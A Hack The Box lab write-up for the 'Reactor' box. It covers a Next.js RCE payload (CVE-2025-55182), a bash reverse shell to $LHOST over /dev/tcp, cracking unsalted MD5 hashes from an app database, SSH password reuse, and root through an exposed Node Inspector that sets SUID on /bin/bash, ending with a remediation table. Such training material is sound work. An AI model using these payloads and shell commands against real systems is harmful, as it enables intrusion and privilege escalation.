# Reactor — HTB Writeup

> **Box:** Reactor (`reactor.htb`)
> **Target IP:** `10.129.89.203`
> **Attacker (tun0):** `$LHOST` — set to your VPN IP (`ip a show tun0`); used throughout in place of the raw address.
> **OS:** Ubuntu 24.04
> **Difficulty:** Easy
> **Flags:** user `redacted`  ·  root `redacted`

> ⚠️ **Live box:** cracked passwords and flag values are intentionally redacted throughout this writeup.

---

## TL;DR — Attack Path

1. **Foothold** — Next.js **v15.0.3** RCE (**CVE-2025-55182**) → code execution as the `node` service account.
2. **Loot** — Read the app's SQLite database (`reactor.db`) → `users` table with **unsalted MD5** hashes.
3. **User** — Cracked `engineer`'s MD5 → password reuse → SSH to `engineer` → **user.txt**.
4. **Root** — `pspy` revealed a root process running `node --inspect=127.0.0.1:9229`. Connected to the exposed **Node.js Inspector**, executed code as root via `Runtime.evaluate`, SUID'd `/bin/bash` → **root.txt**.

```
Next.js RCE (CVE-2025-55182)  →  code exec as node
      │
      ▼
reactor.db  →  crack unsalted MD5  →  engineer's password
      │   (password reuse)
      ▼
engineer  →  user.txt
      │   pspy: root process  node --inspect=127.0.0.1:9229
      ▼
exposed Node Inspector (root)  →  SUID /bin/bash  →  root.txt
```

---

## 1. Enumeration

```bash
nmap -sV -sT -p- 10.129.89.203
sudo nmap -sV -sU 10.129.89.203
nikto -h http://10.129.89.203:3000
```

- Web application on **port 3000** — the default **Next.js** port.
- Nikto leaked a reference to the **Alibaba Cloud metadata endpoint** (`100.100.100.200`) — a rabbit hole (see §5.1).
- **Wappalyzer** fingerprinted the stack as **Next.js v15.0.3** — a version with a known RCE.

---

## 2. Foothold — Next.js RCE (CVE-2025-55182)

Next.js **v15.0.3** is vulnerable to **CVE-2025-55182**, a server-side JS injection / RCE.

- **PoC:** https://github.com/pkrasulia/CVE-2025-55182-NextJS-RCE-PoC

The exploit injects a JS payload evaluated on the server, giving arbitrary command execution in the Node.js process context:

```js
(function(){
    try {
        var res = process.mainModule.require("child_process").execSync("<CMD>").toString();
        console.log("\n[+] RCE RESULT:\n" + res);
        throw new Error("[+] RCE SUCCESS: " + res);
    } catch(e) {
        console.log(e);
        throw e;
    }
})()
```

> **Note:** `require` isn't available directly in the injected (global) context, so the payload reaches it via **`process.mainModule.require(...)`**. This same trick reappears in the root step.

### 2.1 Exploit runner fix — `Promise.withResolvers is not a function`

The PoC initially failed on the **attacker box**:

```
❌ Error: Promise.withResolvers is not a function
```

`Promise.withResolvers()` was only added in **Node.js v22**; Kali shipped an older Node. Fix — upgrade Node:

```bash
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
source ~/.bashrc && nvm install 22 && nvm use 22
```

### 2.2 Confirming RCE

Confirm execution with an ICMP callback:

```bash
# Attacker – listen
sudo tcpdump -i tun0 icmp

# Fire a ping via the exploit
node exploit.js http://10.129.89.203:3000 "ping -c 3 $LHOST"
```

```
10:20:02 IP 10.129.89.203 > $LHOST: ICMP echo request  ← RCE confirmed
```

### 2.3 Reverse shell

```bash
# Attacker
nc -lvnp 4444
```

Bash reverse shell:

```bash
node exploit.js http://10.129.89.203:3000 'bash -c "bash -i >& /dev/tcp/$LHOST/4444 0>&1"'
```

> **Note:** the `bash -c "..."` wrapper is essential — `execSync` runs under `/bin/sh` (dash on Ubuntu), which doesn't understand `>&` or `/dev/tcp`, so the payload has to be handed explicitly to `bash`.

Landed as **`node@reactor`**. Stabilise:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z; stty raw -echo; fg; export TERM=xterm
```

---

## 3. Loot — App Database & Credentials

```bash
node@reactor:~$ find / -iname '*reactor*' 2>/dev/null
/opt/reactor-app/reactor.db
```

Read the `users` table:

```bash
node@reactor:/opt/reactor-app$ sqlite3 reactor.db "SELECT username,password_hash,role,email FROM users;"
admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

### 3.1 Cracking the hashes

32 hex chars = **raw MD5, unsalted**. Because they're unsalted, an online reverse-lookup (**CrackStation**) returns the plaintext instantly — the values were precomputed.

| User | Hash | Plaintext |
|------|------|-----------|
| engineer | `39d97110eafe2a9a68639812cd271e8e` | _(redacted — live box)_ |
| admin | `a203b22191d744a4e70ada5c101b17b8` | _(redacted — live box)_ |

This is exactly why real apps use **salted, slow** hashes (bcrypt/scrypt/Argon2).

---

## 4. User — Password Reuse

The cracked password was reused for the system account:

```bash
ssh engineer@10.129.89.203        # cracked password

engineer@reactor:~$ id
uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)

engineer@reactor:~$ cat ~/user.txt
```

> 🏁 **user.txt captured.**

---

## 5. Privilege Escalation

### 5.1 Rabbit holes (documented so you don't repeat them)

**`lxd` group (101) — DEAD END.** Normally `lxd` membership = instant root, but this is Ubuntu 24.04 where `lxc` is the **`lxd-installer` shim** that runs `snap install lxd` on demand — and the box has **no internet**:

```bash
engineer@reactor:~$ timeout 5 curl -sI https://api.snapcraft.io >/dev/null && echo UP || echo NO INTERNET
NO INTERNET
engineer@reactor:~$ snap list
No snaps are installed yet.
```

Side-loading a snap needs root, so the `lxd` group is a **decoy**.

**Alibaba cloud metadata (`100.100.100.200`)** — the ECS metadata endpoint was reachable and looked promising (RAM STS creds / `user-data`), but did not lead to root on this path.

**Standard local checks — all dead ends:**

```bash
sudo -l                                     # nothing useful
find / -perm -4000 -type f 2>/dev/null      # all default SUIDs
getcap -r / 2>/dev/null                     # all default caps
```

### 5.2 The real vector — process monitoring with pspy

Transfer `pspy` (box has no internet, but reaches Kali over the VPN):

```bash
# Kali
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
python3 -m http.server 8000
# Target
cd /dev/shm && wget http://$LHOST:8000/pspy64 && chmod +x pspy64
./pspy64 -i 1000 | grep --line-buffered 'UID=0'
```

Standout root process:

```
UID=0  PID=1397  | /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

A **root Node.js process with the debug Inspector enabled** on `127.0.0.1:9229` — a full debugger, so connecting gives **arbitrary code execution inside a root process**.

### 5.3 Exploiting the exposed Node Inspector

Confirm the target and grab its details:

```bash
curl -s http://127.0.0.1:9229/json
# → "webSocketDebuggerUrl": "ws://127.0.0.1:9229/<uuid>", Node v20
```

**Why an SSH tunnel?** Look again at the pspy line: the process was started as `node --inspect=`**`127.0.0.1`**`:9229`. That address is the giveaway. The Inspector is bound to the box's **loopback interface only**, so it listens for `localhost` connections *on the box* and is deliberately not exposed to the network — a scan from Kali against port 9229 finds nothing, and there's no way to point DevTools at `10.129.89.203:9229` because that port isn't reachable from outside. A debugger with no authentication is dangerous, and binding it to loopback is the one thing stopping it being remotely trivial to abuse.

An SSH tunnel defeats that binding cleanly. As `engineer` we already have valid SSH creds (the password reuse from §4), so `ssh -L 9229:127.0.0.1:9229` opens a normal SSH session and forwards our **Kali** `127.0.0.1:9229` through the encrypted channel to the box's `127.0.0.1:9229`. From the Inspector's point of view the connection still arrives from local loopback — exactly what it's willing to accept — while DevTools on Kali just talks to its own localhost. In effect the tunnel lets us stand *inside* the box's loopback interface, turning a "localhost-only" service into one we can reach and drive remotely.

**1. SSH tunnel** — forward the box's loopback 9229 to Kali (keep this session open):

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.89.203
```

Verify from Kali:

```bash
curl -s http://127.0.0.1:9229/json    # returns the webSocketDebuggerUrl → tunnel is live
```

**2. Attach with Chrome DevTools** (Chromium-based browser required — Firefox can't attach to a Node inspector):

- Open `chrome://inspect`
- The target `/opt/uptime-monitor/worker.js` usually appears automatically under **Remote Target** (Chromium ships with `localhost:9229` in its default network-target list). If not, click **Configure…** and add `127.0.0.1:9229`.
- Click **inspect** to open a DevTools window attached to the root Node process.

**3. In the DevTools Console**, execute code in the root process:

```js
process.mainModule.require('child_process').execSync('chmod +s /bin/bash').toString()
```

> **Key detail:** inside the Console the context is global, where `require` is undefined. Reach it via **`process.mainModule.require(...)`** (same as the foothold payload). A successful run returns `''` (execSync returns empty).

### 5.4 Root shell

```bash
engineer@reactor:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root ... /bin/bash        # SUID bit set

engineer@reactor:~$ /bin/bash -p
bash-5.2# id
uid=1000(engineer) gid=1000(engineer) euid=0(root) ...
bash-5.2# cat /root/root.txt
```

> 🏆 **root.txt captured.**

---

## 6. Remediation

| Issue | Fix |
|-------|-----|
| Server-side JS injection in Next.js | Never `eval`/execute user-controlled input; validate & sandbox; patch the framework. |
| Unsalted MD5 password storage | Use a slow, salted KDF (bcrypt/scrypt/Argon2). |
| Password reuse (DB hash → system account) | Unique, high-entropy passwords per account. |
| **Node `--inspect` running as root** | Never expose the Inspector in production; bind behind localhost with auth, never as root. |
| App/service running as root | Run services as a dedicated low-privilege user. |

